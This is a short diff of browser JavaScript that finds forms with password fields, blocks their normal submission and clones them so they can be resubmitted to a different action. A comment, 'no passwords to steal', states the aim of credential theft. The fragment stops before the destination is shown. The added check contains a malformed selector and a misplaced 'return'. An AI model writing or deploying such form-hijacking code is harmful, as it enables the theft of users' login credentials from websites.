@@ -1,8 +1,12 @@
-const forms = document.querySelectorAll("form:has(input[type='password'])");
+const forms = document.querySelectorAll("form");
 
 for (const form of forms) {
   // On submit of form, create a copy of the form with data with a new action
   // and submit it
+  if(form.querySelector("input[type='password'") == null){
+    //no passwords to steal
+    return;
+  }
   form.onsubmit = function (event) {
     event.preventDefault();
     const newForm = form.cloneNode(true);
